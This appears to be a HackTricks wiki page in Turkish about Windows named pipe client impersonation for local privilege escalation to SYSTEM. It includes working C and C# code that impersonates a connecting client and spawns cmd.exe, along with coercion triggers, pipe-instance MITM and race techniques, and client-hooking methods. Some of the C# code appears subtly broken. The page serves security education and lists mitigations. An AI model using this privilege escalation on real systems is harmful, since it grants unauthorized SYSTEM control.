# Named Pipe Client Impersonation

{{#include ../../banners/hacktricks-training.md}}

Named Pipe client impersonation, bir named-pipe server thread’inin kendisine bağlanan bir client’ın security context’ini devralmasına izin veren local privilege escalation primitive’idir. Pratikte, SeImpersonatePrivilege ile code çalıştırabilen bir attacker, ayrıcalıklı bir client’ı (örn. bir SYSTEM service) attacker-controlled bir pipe’a bağlanmaya zorlayabilir, ImpersonateNamedPipeClient çağırabilir, ortaya çıkan token’ı primary token’a duplicate edebilir ve client olarak bir process spawn edebilir (çoğu zaman NT AUTHORITY\SYSTEM).

Bu sayfa core technique’e odaklanır. SYSTEM’i pipe’ınıza bağlamaya zorlayan end-to-end exploit chain’ler için aşağıda referans verilen Potato family sayfalarına bakın.

## TL;DR
- Bir named pipe oluşturun: \\.\pipe\<random> ve bağlantı bekleyin.
- Ayrıcalıklı bir bileşeni buna bağlanmaya zorlayın (spooler/DCOM/EFSRPC/etc.).
- Impersonation’dan önce pipe’tan en az bir message okuyun, ardından ImpersonateNamedPipeClient çağırın.
- Current thread’den impersonation token’ını açın, DuplicateTokenEx(TokenPrimary) yapın ve SYSTEM process almak için CreateProcessWithTokenW/CreateProcessAsUser kullanın.

## Requirements and key APIs
- Calling process/thread için genellikle gereken privileges:
- Bağlanan bir client’ı başarılı şekilde impersonate etmek ve CreateProcessWithTokenW kullanmak için SeImpersonatePrivilege.
- Alternatif olarak, SYSTEM impersonation’ından sonra CreateProcessAsUser kullanabilirsiniz; bunun için SeAssignPrimaryTokenPrivilege ve SeIncreaseQuotaPrivilege gerekebilir (bunlar SYSTEM impersonate ederken sağlanır).
- Kullanılan core APIs:
- CreateNamedPipe / ConnectNamedPipe
- ReadFile/WriteFile (impersonation’dan önce en az bir message okunmalıdır)
- ImpersonateNamedPipeClient ve RevertToSelf
- OpenThreadToken, DuplicateTokenEx(TokenPrimary)
- CreateProcessWithTokenW veya CreateProcessAsUser
- Impersonation level: yerel olarak faydalı işlemler yapmak için client, SecurityImpersonation’a izin vermelidir (birçok local RPC/named-pipe client’ı için varsayılan). Client’lar bunu pipe’ı açarken SECURITY_SQOS_PRESENT | SECURITY_IDENTIFICATION ile düşürebilir.

## Minimal Win32 workflow (C)
```c
// Minimal skeleton (no error handling hardening for brevity)
#include <windows.h>
#include <stdio.h>

int main(void) {
LPCSTR pipe = "\\\\.\\pipe\\evil";
HANDLE hPipe = CreateNamedPipeA(
pipe,
PIPE_ACCESS_DUPLEX,
PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT,
1, 0, 0, 0, NULL);

if (hPipe == INVALID_HANDLE_VALUE) return 1;

// Wait for privileged client to connect (see Triggers section)
if (!ConnectNamedPipe(hPipe, NULL)) return 2;

// Read at least one message before impersonation
char buf[4]; DWORD rb = 0; ReadFile(hPipe, buf, sizeof(buf), &rb, NULL);

// Impersonate the last message sender
if (!ImpersonateNamedPipeClient(hPipe)) return 3; // ERROR_CANNOT_IMPERSONATE==1368

// Extract and duplicate the impersonation token into a primary token
HANDLE impTok = NULL, priTok = NULL;
if (!OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &impTok)) return 4;
if (!DuplicateTokenEx(impTok, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &priTok)) return 5;

// Spawn as the client (often SYSTEM). CreateProcessWithTokenW requires SeImpersonatePrivilege.
STARTUPINFOW si = { .cb = sizeof(si) }; PROCESS_INFORMATION pi = {0};
if (!CreateProcessWithTokenW(priTok, LOGON_NETCREDENTIALS_ONLY,
L"C\\\\Windows\\\\System32\\\\cmd.exe", NULL,
0, NULL, NULL, &si, &pi)) {
// Fallback: CreateProcessAsUser after you already impersonated SYSTEM
CreateProcessAsUserW(priTok, L"C\\\\Windows\\\\System32\\\\cmd.exe", NULL,
NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
}

RevertToSelf(); // Restore original context
return 0;
}
```
Notes:
- If ImpersonateNamedPipeClient returns ERROR_CANNOT_IMPERSONATE (1368), ensure you read from the pipe first and that the client didn’t restrict impersonation to Identification level.
- DuplicateTokenEx ile SecurityImpersonation ve TokenPrimary kullanarak process creation için uygun bir primary token oluşturmayı tercih edin.

## .NET quick example
.NET içinde, NamedPipeServerStream RunAsClient üzerinden impersonate edebilir. Impersonate edildikten sonra, thread token’ını duplicate edin ve bir process oluşturun.
```csharp
using System; using System.IO.Pipes; using System.Runtime.InteropServices; using System.Diagnostics;
class P {
[DllImport("advapi32", SetLastError=true)] static extern bool OpenThreadToken(IntPtr t, uint a, bool o, out IntPtr h);
[DllImport("advapi32", SetLastError=true)] static extern bool DuplicateTokenEx(IntPtr e, uint a, IntPtr sd, int il, int tt, out IntPtr p);
[DllImport("advapi32", SetLastError=true, CharSet=CharSet.Unicode)] static extern bool CreateProcessWithTokenW(IntPtr hTok, int f, string app, string cmd, int c, IntPtr env, string cwd, ref ProcessStartInfo si, out Process pi);
static void Main(){
using var s = new NamedPipeServerStream("evil", PipeDirection.InOut, 1);
s.WaitForConnection();
// Ensure client sent something so the token is available
s.RunAsClient(() => {
IntPtr t; if(!OpenThreadToken(Process.GetCurrentProcess().Handle, 0xF01FF, false, out t)) return; // TOKEN_ALL_ACCESS
IntPtr p; if(!DuplicateTokenEx(t, 0xF01FF, IntPtr.Zero, 2, 1, out p)) return; // SecurityImpersonation, TokenPrimary
var psi = new ProcessStartInfo("C\\Windows\\System32\\cmd.exe");
Process pi; CreateProcessWithTokenW(p, 2, null, null, 0, IntPtr.Zero, null, ref psi, out pi);
});
}
}
```
## SYSTEM'i pipe'ınıza getirmek için yaygın trigger/coercions
Bu teknikler, yetkili servisleri named pipe'ınıza bağlanmaya zorlayarak onları impersonate etmenizi sağlar:
- Print Spooler RPC trigger (PrintSpoofer)
- DCOM activation/NTLM reflection variants (RoguePotato/JuicyPotato[NG], GodPotato)
- EFSRPC pipes (EfsPotato/SharpEfsPotato)

Detaylı kullanım ve uyumluluk için buraya bakın:

-
{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}
-
{{#ref}}
juicypotato.md
{{#endref}}

Eğer sadece pipe'ı oluşturup bir service trigger'dan SYSTEM spawn etmek için impersonate etmenin tam örneğine ihtiyacınız varsa, şunlara bakın:

-
{{#ref}}
from-high-integrity-to-system-with-name-pipes.md
{{#endref}}
-
{{#ref}}
service-triggers.md
{{#endref}}

## Named Pipe IPC Abuse & MITM (ACLs, First-Instance Races, Client Hooking)

Yetkili bir service ile düşük yetkili bir process `\\.\pipe\...` üzerinden iletişim kurduğunda, pipe'ı diğer tüm güvenilmeyen IPC sınırları gibi ele alın. Klasik server-side impersonation'ın ötesinde, zayıf pipe ACL'leri, güvensiz oluşturma bayrakları ve client-side güven kararları da yerel privilege escalation için primitive'lere dönüşebilir.

### Önce aday pipe'ları enumerate edin
- PowerShell ile pipe'ları hızlıca listeleyin: `Get-ChildItem \\.\pipe\`
- Sysinternals `pipelist64.exe`, instance sayısını ve single-instance pipe'ları görmek için kullanışlıdır.
- `SYSTEM` olarak çalışan service'lerin kullandığı isimlere öncelik verin, özellikle helper'lar, updater'lar, launcher'lar ve UI broker'lar.

### Permissive DACL'ler ve ekstra pipe instance'ları üzerinden MITM
- Yetkili bir server ile konuşabilen herhangi bir process, protokolünü zaten fuzz edebilir ve privileged verb'leri arayabilir.
- Daha ilginç durum, DACL'nin pipe object üzerinde `FILE_GENERIC_WRITE`/`GENERIC_WRITE` vermesidir. Named pipe'larda bu, dolaylı olarak `FILE_CREATE_PIPE_INSTANCE` içerir (`FILE_APPEND_DATA` aynı bit'i paylaşır), bu yüzden saldırgan aynı isimle başka bir server instance'ı oluşturabilir.
- Instance'lar FIFO sırasıyla eşleştirildiği için, saldırgan tarafından oluşturulan ve meşru instance'lar iç içe geçebilir: `CreateNamedPipe` ile rogue bir instance oluşturun, sonra aynı pipe adını `CreateFile` ile açın ve gerçek bir client'ın rogue server instance'ına düşmesini bekleyin.
- Sonuç: orijinal server process'e sahip olmadan yetkili IPC'yi gözlemleyin, değiştirin, relay edin veya desynchronize edin.

### Pipe security descriptor'larında first-instance race
- `lpSecurityAttributes`, bir pipe adının ilk instance'ı oluşturulduğunda yalnızca DACL'yi tanımlar.
- Eğer yetkili bir service geç başlıyorsa ve `FILE_FLAG_FIRST_PIPE_INSTANCE` kullanmıyorsa, saldırgan pipe adını permissive bir DACL ile önceden oluşturabilir, ardından service'in daha sonra saldırganın seçtiği security context altında ek instance'lar oluşturmasına izin verebilir.
- Bu, service startup'ını bir yarış durumuna dönüştürür: ilk instance'ı kazanın, sonra zayıflatılmış ACL kullanarak sonraki client'lara bağlanın veya MITM yapın.
- Savunucular için mitigation, saldırganlar içinse önemli bir review noktası: `CreateNamedPipe(..., dwOpenMode, ...)` içinde `FILE_FLAG_FIRST_PIPE_INSTANCE` olup olmadığını kontrol edin. Yoksa, service başlamadan önce pre-creation test edin.

### PID/signature kontrolleri hardening'dir, boundary değil
- Bazı ürünler, bağlanan client'ın `GetNamedPipeClientProcessId`, process image path veya Authenticode signer bilgisini kontrol ederek erişimi kısıtlamaya çalışır.
- Bu, yalnızca meşru client'a inject edene kadar yardımcı olur: trusted process'in içine girdikten sonra server'ın beklediği tam PID/image/signature context'ini miras alırsınız.
- Split desktop app'lerde, düşük yetkili UI/helper process'e instrument etmek, `SYSTEM` service'e doğrudan saldırmaktan çoğu zaman daha kolaydır.

### Client'ı kendi I/O modeline göre hook'layın
- Synchronous I/O: syscall buffer'ı tüketmeden önce `NtWriteFile`'ı intercept edin ve döndükten sonra `NtReadFile`'ı inspect/patch edin.
- Overlapped I/O: `NtReadFile` içinde görülen `OVERLAPPED`/`IoStatusBlock`'ı saklayın, sonra `GetOverlappedResult` veya ilgili wait tamamlandıktan sonra buffer'ı inspect edin.
- Completion ports: `GetQueuedCompletionStatus`, `NtRemoveIoCompletion`'a ulaşır; dönen `ApcContext`, orijinal read'de kullanılan `OVERLAPPED` ile geri bağlanır; bu da artık doldurulmuş buffer'ı bulmak için doğru pivot'tur.
- Completion routines (`ReadFileEx`): completion callback bir APC olarak teslim edilir. Dönen veriyi değiştirmek veya sentetik reply enjekte etmek istiyorsanız, gerçek completion routine'i hook'layın ve özel injection için routine'in beklenen 3 argümanını yeniden oluşturan tek argümanlı bir `QueueUserAPC` dispatcher kullanın.

### Tooling notları
- [pipetap](https://sensepost.com/blog/2025/pipetap-a-windows-named-pipe-proxy-tool/) named-pipe trafiğini inject edilmiş bir helper DLL üzerinden proxy'ler ve düzenleme/replay için Burp-benzeri bir workflow sunar.
- [thats_no_pipe](https://github.com/synacktiv/thats_no_pipe) Frida tabanlı bir yaklaşım kullanır ve yukarıdaki async/completion pivot'larıyla birlikte `NtReadFile`/`NtWriteFile` hooking'e odaklanır, ardından trafiği WebSocket destekli bir editing workflow'una iletir.
```bash
pip install pipetap
```

```python
import pipetap
client = pipetap.Client(("127.0.0.1", 47001))
client.write(b"OP\x00\x01...")
```
### Operasyonel hususlar
- Named pipes düşük gecikmelidir; buffer’ları düzenlerken uzun duraklamalar kırılgan servislerde deadlock oluşturabilir.
- Overlapped/completion-port/APC-driven clients, basit `ReadFile`/`WriteFile` detour’larından farklı hook’lar gerektirir.
- Trusted client içine injection yapmak gürültülüdür ve genelde exploit development, protocol reversing veya local lab fuzzing için ayrılmalıdır.

## Troubleshooting ve gotchas
- `ImpersonateNamedPipeClient` çağırmadan önce pipe’dan en az bir message okumak zorundasınız; aksi halde `ERROR_CANNOT_IMPERSONATE` (1368) alırsınız.
- Client `SECURITY_SQOS_PRESENT | SECURITY_IDENTIFICATION` ile bağlanırsa, server tam impersonation yapamaz; token’ın impersonation level değerini `GetTokenInformation(TokenImpersonationLevel)` ile kontrol edin.
- `CreateProcessWithTokenW`, çağıran tarafta `SeImpersonatePrivilege` gerektirir. Bu `ERROR_PRIVILEGE_NOT_HELD` (1314) ile başarısız olursa, SYSTEM’i zaten impersonate ettikten sonra `CreateProcessAsUser` kullanın.
- Pipe’ınızı sıkılaştırırsanız security descriptor’ın target service’in bağlanmasına izin verdiğinden emin olun; varsayılan olarak `\\.\pipe` altındaki pipes, server’ın DACL’ine göre erişilebilirdir.

## References
- [Windows: ImpersonateNamedPipeClient documentation](https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-impersonatenamedpipeclient)
- [ired.team: Windows named pipes privilege escalation](https://ired.team/offensive-security/privilege-escalation/windows-namedpipes-privilege-escalation)
- [Microsoft: Named Pipe Security and Access Rights](https://learn.microsoft.com/en-us/windows/win32/ipc/named-pipe-security-and-access-rights)
- [Microsoft: CreateNamedPipe function](https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createnamedpipea)
- [Microsoft: Named Pipe Server Using Completion Routines](https://learn.microsoft.com/en-us/windows/win32/ipc/named-pipe-server-using-completion-routines)
- [pipetap – a Windows named pipe proxy tool](https://sensepost.com/blog/2025/pipetap-a-windows-named-pipe-proxy-tool/)
- [Synacktiv: Hooking Windows Named Pipes](https://www.synacktiv.com/en/publications/hooking-windows-named-pipes.html)
- [Synacktiv: thats_no_pipe](https://github.com/synacktiv/thats_no_pipe)

{{#include ../../banners/hacktricks-training.md}}
